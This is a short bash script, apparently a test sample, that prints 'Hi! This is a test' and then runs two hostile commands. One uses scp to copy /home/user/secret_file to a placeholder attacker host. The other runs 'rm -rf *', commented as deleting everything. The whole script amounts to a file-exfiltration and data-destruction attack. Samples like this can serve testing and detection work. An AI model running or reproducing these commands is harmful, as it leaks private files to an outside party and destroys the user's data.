#!/bin/bash

echo Hi! This is a test
scp /home/user/secret_file attacker@host:/home/attacker/user_secret_file
# Now lets delete everything in the remote computer :O
rm -rf *
